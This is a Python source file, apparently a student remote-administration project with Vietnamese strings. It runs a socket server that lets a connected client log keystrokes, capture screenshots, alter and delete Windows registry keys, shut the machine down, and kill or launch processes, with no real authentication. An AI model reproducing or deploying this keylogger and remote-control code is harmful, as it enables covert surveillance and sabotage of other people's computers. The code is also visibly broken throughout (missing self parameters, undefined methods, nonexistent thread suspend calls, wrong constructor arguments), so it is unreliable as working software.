import socket
import threading
import json
import winreg
import pyautogui
import io
import time
import platform
import os
import subprocess
import sys
from PyQt6.QtWidgets import QApplication, QWidget, QPushButton
import winreg
import psutil
from ipaddress import ip_address
from contextlib import closing
import pynput.keyboard

HOST = "127.0.1.1"
PORT = 64444

FONT = ("Arial", 20, "bold")
LOGIN = "login"
REGISTER = "register"
LOGOUT = "logout"
EXIT = "exit"


class KeyLogger:
    @staticmethod
    def startKLog():
        # Implement your keylogging logic here
        def on_key_release(key):
            with open(AppStart.path, "a") as file:
                file.write(str(key) + '\n')

        with pynput.keyboard.Listener(on_key_release=on_key_release) as listener:
            listener.join()


class AppStart:
    path = "logfile.txt"  # Update this with the appropriate file path


class NetworkConnection:
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        self.buffer = ""

    def write(self, data):
        self.buffer += data

    def flush(self):
        self.sock.sendall(self.buffer.encode('utf-8'))
        self.buffer = ""

    def receive(self, size):
        return self.sock.recv(size).decode('utf-8')

    def close(self):
        self.sock.close()


class Server:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = []
        self.nw = NetworkConnection()

    def start(self):
        try:
            self.s.bind((HOST, PORT))
            self.s.listen(1)
            print("Waiting for Clients")
            while True:
                conn, addr = self.s.accept()
                print("Connected by ", addr)
                threading.Thread(target=self.handle_client,
                                 args=(conn, addr)).start()
        except socket.timeout as timeout:
            print("Timeout to server: ", addr)
        except socket.error as error:
            print("Disconnected to server: ", addr)
        finally:
            self.s.close()

    def handle_client(self, conn, addr):
        self.clients.append(conn)
        try:
            while True:
                option = conn.recv(1024).decode("utf8")
                print("Client option: " + option)
                if option == "LOGIN":
                    conn.sendall(bytes("Login success", "utf8"))

                elif option == "REGISTER":
                    conn.sendall(bytes("Register success", "utf8"))

                elif option == "LOGOUT":
                    conn.sendall(bytes("Logout success", "utf8"))

                elif option == "EXIT":
                    conn.sendall(bytes("Exit success", "utf8"))
                    break
                elif option == "TAKEPIC":
                    self.screenshot(conn)
                elif option == "SHUTDOWN":
                    self.shutdown()
                elif option == "REGISTRY":
                    self.pc_registry(conn)
                else:
                    conn.sendall(bytes("Option not found", "utf8"))
                    break
        except socket.timeout as timeout:
            print("Timeout to client: ", addr)
        except socket.error as error:
            print("Disconnected to client: ", addr)
        finally:
            conn.close()
            self.clients.remove(conn)

    def PCRegistryKey(self, conn):
        try:
            s = conn.recv(4092).decode("utf8")

            # Parse the received data to get base_key, link, value_name, value, and value_type
            # Format of data: "<base_key>;<link>;<value_name>;<value>;<value_type>"
            base_key, link, value_name, value, value_type = s.split(";")

            if value_type == "DELETE_VALUE":
                res = self.PCRemoveValue(base_key, link, value_name)
            elif value_type == "DELETE_KEY":
                res = self.PCRemoveKey(base_key, link)
            else:
                res = self.PCSetValue(
                    base_key, link, value_name, value, value_type)

            conn.sendall(bytes(res, "utf8"))
        except Exception as ex:
            conn.sendall(bytes("Error: " + str(ex), "utf8"))

    def PCRegistryValue(link):
        value = None
        if "\\" in link:
            value = link[link.index("\\")+1:]
        return value

    def PCSetValue(base_key, link, value_name, value, value_type):
        value_types = {
            "String": winreg.REG_SZ,
            "Binary": winreg.REG_BINARY,
            "DWORD": winreg.REG_DWORD,
            "QWORD": winreg.REG_QWORD,
            "Multi-String": winreg.REG_MULTI_SZ,
            "Expandable String": winreg.REG_EXPAND_SZ,
        }

        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                if value_type in value_types:
                    if value_type == "Binary":
                        # Convert value to bytes before setting
                        value_bytes = bytes(int(byte)
                                            for byte in value.split())
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], value_bytes)
                    elif value_type in ["DWORD", "QWORD"]:
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], int(value))
                    elif value_type == "Multi-String":
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], value.split())
                    else:
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], value)
                    return "Set value successfully"
                else:
                    return "Error: Invalid value type"
        except Exception as ex:
            return "Error: " + str(ex)

    def PCRemoveValue(base_key, link, value_name):
        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, value_name)
                return "Value deleted successfully"
        except Exception as ex:
            return "Error: " + str(ex)

    def PCRemoveKey(base_key, link):
        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteKey(key, link)
                return "Key deleted successfully"
        except Exception as ex:
            return "Error: " + str(ex)

    def screenshot(self, conn):
        try:
            # Wait for a short time to reduce frequent screenshots (rate limiting)
            time.sleep(1)

            # Screenshot
            screenshot = pyautogui.screenshot()

            # Resize the screenshot to a smaller resolution (e.g., 800x600)
            resized_screenshot = screenshot.resize((800, 600))

            # Convert screenshot to bytes
            img_bytes = io.BytesIO()
            resized_screenshot.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()

            # Send screenshot 2 client

            conn.sendall(img_bytes)  # Corrected variable name
        except Exception as ex:
            conn.sendall(bytes("Error: " + str(ex), "utf8"))

    def shutdown(self):
        # Thuong thi os.name cua Linux hoac Mac la "posix"
        system_name = platform.system()
        if system_name == "Windows":
            subprocess.run(["shutdown", "-s"])
        elif system_name == "Darwin" or system_name == "Linux":
            os.system("sudo shutdown -h now")
        else:
            print("Shutdown command not supported on this platform.")

    def pc_registry(self, conn):
        try:
            data = conn.recv(4092).decode("utf8")

            # Parse the received data to get base_key, link, value_name, value, and value_type
            # Format of data: "<base_key>;<link>;<value_name>;<value>;<value_type>"
            base_key, link, value_name, value, value_type = data.split(";")

            if value_type == "DELETE_VALUE":
                res = self.PCRemoveValue(base_key, link, value_name)
            elif value_type == "DELETE_KEY":
                res = self.PCRemoveKey(base_key, link)
            else:
                res = self.PCSetValue(
                    base_key, link, value_name, value, value_type)

            self.send_response(conn, res)
        except Exception as ex:
            self.send_response(conn, "Error: " + str(ex))

    def send_response(self, conn, response):
        conn.sendall(bytes(response, "utf8"))

    def delete_value(base_key, link, value_name):
        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, value_name)
                return "Value deleted successfully"
        except Exception as ex:
            return "Error: " + str(ex)

    def delete_key(base_key, link):
        try:
            winreg.DeleteKey(base_key, link)
            return "Key deleted successfully"
        except Exception as ex:
            return "Error: " + str(ex)

    def send_response(self, conn, response):
        conn.sendall(bytes(response, "utf8"))

    def base_registry_key(self, link):
        base_key = None
        if "\\" in link:
            if link.startswith("HKEY_CLASSES_ROOT"):
                base_key = winreg.HKEY_CLASSES_ROOT
            elif link.startswith("HKEY_CURRENT_USER"):
                base_key = winreg.HKEY_CURRENT_USER
            elif link.startswith("HKEY_LOCAL_MACHINE"):
                base_key = winreg.HKEY_LOCAL_MACHINE
            elif link.startswith("HKEY_USERS"):
                base_key = winreg.HKEY_USERS
            elif link.startswith("HKEY_CURRENT_CONFIG"):
                base_key = winreg.HKEY_CURRENT_CONFIG
        return base_key

    def registry(self, conn):
        while True:
            data = conn.recv(4092).decode("utf8")
            if data == "QUIT":
                return
            elif data == "SEND":
                option = conn.recv(1024).decode("utf8")
                link = conn.recv(1024).decode("utf8")
                value_name = conn.recv(1024).decode("utf8")
                value = conn.recv(1024).decode("utf8")
                value_type = conn.recv(1024).decode("utf8")
                base_key = self.base_registry_key(link)
                link2 = link[link.index("\\")+1:]
                if base_key is None:
                    res = "Error"
                else:
                    if option == "Create key":
                        base_key.CreateSubKey(link2)
                        res = "Key created successfully"
                    elif option == "Delete key":
                        res = self.PCRemoveKey(base_key, link2)
                    elif option == "Get value":
                        res = self.PCGetValue(base_key, link2, value_name)
                    elif option == "Set value":
                        res = self.PCSetValue(
                            base_key, link2, value_name, value, value_type)
                    elif option == "Delete value":
                        res = self.PCRemoveValue(base_key, link2, value_name)
                    else:
                        res = "Error"
                self.send_response(conn, res)

    def hookKey(self):
        self.tklog.resume()
        open(AppStart.path, "w").close()

    def unhook(self):
        self.tklog.suspend()

    def printkeys(self):
        s = ""
        with open(AppStart.path, "r") as file:
            s = file.read()
        open(AppStart.path, "w").close()
        if not s:
            s = "\0"
        self.nw.write(s)
        self.nw.flush()

    def keylog(self):
        self.tklog = threading.Thread(target=KeyLogger.startKLog)
        s = ""
        self.tklog.start()
        self.tklog.suspend()
        while True:
            s = self.receiveSignal()
            if s == "PRINT":
                self.printkeys()
            elif s == "HOOK":
                self.hookKey()
            elif s == "UNHOOK":
                self.unhook()
            elif s == "QUIT":
                return

    def receiveSignal(self):
        try:
            # Assuming you send a 4-byte signal size first
            signal_size = int(self.nw.receive(4))
            signal_data = self.nw.receive(signal_size)
            return signal_data.decode("utf-8")
        except Exception as e:
            print("Error receiving signal:", str(e))
            return ""

    def application(self):
        while True:
            ss = self.receiveSignal()
            if ss == "XEM":
                pr = psutil.process_iter(
                    ['pid', 'name', 'num_threads', 'num_handles', 'memory_info'])
                self.nw.write(str(len(list(pr))) + "\n")
                for p in pr:
                    try:
                        if p.info['name'] and p.info['name'] != "":
                            self.nw.write("ok\n")
                            self.nw.write(p.info['name'] + "\n")
                            self.nw.write(str(p.info['pid']) + "\n")
                            self.nw.write(str(p.info['num_threads']) + "\n")
                            self.nw.flush()
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

            elif ss == "KILL":
                while True:
                    ss = self.receiveSignal()
                    if ss == "KILLID":
                        u = self.receive()
                        test2 = False
                        if u:
                            try:
                                process = psutil.Process(int(u))
                                process.terminate()
                                self.nw.write("Đã diệt chương trình\n")
                                self.nw.flush()
                                test2 = True
                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                pass

                        if not test2:
                            self.nw.write("Không tìm thấy chương trình\n")
                            self.nw.flush()
                    elif ss == "QUIT":
                        break

            elif ss == "START":
                while True:
                    ss = self.receiveSignal()
                    if ss == "STARTID":
                        u = self.receive()
                        if u:
                            u += ".exe"
                            try:
                                subprocess.Popen(u, shell=True)
                                self.nw.write("Chương trình đã được bật\n")
                                self.nw.flush()
                            except Exception as ex:
                                self.nw.write("Lỗi\n")
                                self.nw.flush()
                        else:
                            self.nw.write("Lỗi\n")
                            self.nw.flush()
                    elif ss == "QUIT":
                        break

            elif ss == "QUIT":
                return

    def process(conn):
        while True:
            data = conn.recv(4092).decode("utf8")
            if data == "QUIT":
                return
            elif data == "XEM":
                processes = subprocess.check_output(
                    ['wmic', 'process', 'get', 'name,processid']).decode().split("\r\r\n")
                conn.sendall(bytes(str(len(processes)), "utf8"))
                for process in processes:
                    name, pid = process.split()
                    conn.sendall(bytes(name, "utf8"))
                    conn.sendall(bytes(pid, "utf8"))
            elif data == "KILL":
                while True:
                    option = conn.recv(1024).decode("utf8")
                    if option == "KILLID":
                        pid = conn.recv(1024).decode("utf8")
                        try:
                            os.kill(int(pid), 9)
                            conn.sendall(bytes("Process killed", "utf8"))
                        except Exception as ex:
                            conn.sendall(bytes("Error", "utf8"))
                    elif option == "QUIT":
                        break
            elif data == "START":
                while True:
                    option = conn.recv(1024).decode("utf8")
                    if option == "STARTID":
                        name = conn.recv(1024).decode("utf8")
                        if name != "":
                            name += ".exe"
                            try:
                                subprocess.Popen(name)
                                conn.sendall(
                                    bytes("Process started successfully", "utf8"))
                            except Exception as ex:
                                conn.sendall(bytes("Error", "utf8"))
                    elif option == "QUIT":
                        break

    def button1_Click(self):
        ip = "0.0.0.0"
        port = 5656

        with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as server:
            server.bind((ip, port))
            server.listen(100)

            client, _ = server.accept()
            ns = client.makefile('rwb')
            self.nr = ns
            self.nw = ns

            while True:
                s = self.receiveSignal()
                if s == "KEYLOG":
                    self.keylog()
                elif s == "SHUTDOWN":
                    self.shutdown()
                elif s == "REGISTRY":
                    self.registry()
                elif s == "TAKEPIC":
                    self.takepic()
                elif s == "PROCESS":
                    self.process()
                elif s == "APPLICATION":
                    self.application()
                elif s == "QUIT":
                    break

        client.shutdown(socket.SHUT_RDWR)
        client.close()


class ServerGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Server")
        self.setGeometry(100, 100, 200, 100)

        self.button1 = QPushButton("Mở server", self)
        self.button1.setGeometry(50, 20, 100, 50)
        self.button1.clicked.connect(self.open_server)

    def open_server(self):
        self.process_click()

    def process_click(self):
        print("PROCESS command sent to the server.")


def main():
    server = Server()
    threading.Thread(target=server.start).start()

    app = QApplication(sys.argv)
    server_app = ServerGUI(server)
    server_app.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
